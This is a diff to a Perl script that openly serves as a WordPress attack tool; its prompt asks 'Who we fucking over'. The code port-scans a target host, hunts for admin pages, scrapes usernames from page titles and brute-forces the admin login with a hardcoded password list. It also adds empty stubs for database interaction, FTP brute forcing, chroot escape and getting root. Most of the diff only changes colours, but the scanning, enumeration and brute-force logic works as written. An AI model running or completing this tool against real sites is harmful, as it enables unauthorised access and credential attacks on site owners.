@@ -48,14 +48,17 @@ $bot -> timeout(10);
 $bot -> agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
 $bot -> cookie_jar($cookie);
 #####################################
-print color('yellow');
+print color('bold yellow');
 print $banner;
 print "\n\n[*]Who we fucking over => ";
+print color('reset');
+print color('bold red');
 chomp(my $host = <STDIN>);
 #print "\n\n[*]Enter the path to the list of usernames => ";
 #chomp(my $user = <STDIN>);
 #print "\n\n[*]Enter the path to the list of passwords => ";
 #chomp(my $pass = <STDIN>);
+print color('reset');
 #####################################
 #Running subroutines
 port_scanner();
@@ -66,14 +69,15 @@ user_find();
 ####
 #Port scanner
 sub port_scanner {
+  print color('bold yellow');
   print "\n\n++++++++++++++++++++++++++++++\n";
-  print "[*]Port scan\n";
+  print "[*]Port scanning $host\n";
   print "++++++++++++++++++++++++++++++\n";
   print color('reset');
   #looks for ports in the array
   foreach my $port (@ports){
       if($sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => 'tcp', Timeout => 1)){
-          print color('green');
+          print color('bold green');
           print "[*] =>\tPort $port is open\n";
           print color('reset');
           push @oports, $port; #pushing the open port to an array for later use
@@ -85,10 +89,11 @@ sub port_scanner {
     }
   }
 }
+
 ####
 #Finding admin pages
 sub admin_find {
- print color('yellow');
+ print color('bold yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Hunting for an admin page\n";
  print "++++++++++++++++++++++++++++++++++\n";
@@ -107,20 +112,25 @@ sub admin_find {
 	    print "[*] =>\t$hunt \n";
       print color('reset');
       last;
-      return $hunt;
     }
 	  elsif ($res->content=~/Access Denied/){ #if the admin page is found, but pulls a 403 error, will let the user know
+      print color('bold green');
       print "[*]Found the admin page : $hunt => [Error & Access Denied]\n";
+      print color('reset');
       last;
 	  }
 	  else {
+      print color('red');
+      print "[*]Unable to find an admin page\n";
+      print color('reset');
 	  }
   }
 }
+
 ####
 #WordPress user discovery
 sub user_find {
-  print color('yellow');
+  print color('bold yellow');
   print "++++++++++++++++++++++++++++++++++\n";
   print "[*]Looking for a user\n";
   print "++++++++++++++++++++++++++++++++++\n";
@@ -130,7 +140,7 @@ sub user_find {
   my $userhunt = $bot->request($req)->content; #sends the request then decodes the content so it doesn't load a hash
   if($userhunt =~/<title>([a-zA-Z\/][^>]+)<\/title>/){ #filtering for the username in the pages title
     my $victim = $1; #grabs the content between the <title> tags
-    print color('boldgreen');
+    print color('bold green');
     print "[*]Found user\n";
     print "[*] =>\t$victim \n";
     print color('reset');
@@ -138,17 +148,21 @@ sub user_find {
   }
   else{
     print color('red');
-    print "[*]Unable to find a user\n";
+    print "[*]Unable to find a user\n[*]Using user provided username list\n";
     print color('reset');
   }
 }
 
+####
+#Version discovery
+sub version_find {}
 
+####
 #Admin Page Brute force
 sub brute_force {
-  my $victim = shift;
+  my $victim = shift; #Sets the variable up allow input
   my @passwds = qw(password 123 admin admin123 BTekgFutvcx1L%9pbN); #support for file reading coming soon
-  print color('yellow');
+  print color('bold yellow');
   print "++++++++++++++++++++++++++++++++++\n";
   print "[*]Trying to break the Admin login\n";
   print "++++++++++++++++++++++++++++++++++\n";
@@ -171,20 +185,35 @@ sub brute_force {
       }
     }
   }
-####
-#Maybe XSS or SQL, don't know yet
 
+####
+#Database discovery
+sub db_find {}
+
+####
+#Database interaction
+sub db_int {}
 
 ####
 #FTP brute forcing
 sub ftp_brute {
-  print color('yellow');
+  print color('bold yellow');
   print "++++++++++++++++++++++++++++++++++\n";
   print "[*]Trying to break the FTP login\n";
   print "++++++++++++++++++++++++++++++++++\n";
   print color('reset');
 }
 
-
 ####
 #FTP commands
+sub ftp {}
+
+####
+#FTP CHROOT jail breaking
+sub jail_break{}
+
+####
+#Get root
+sub get_root{}
+
+###############################################
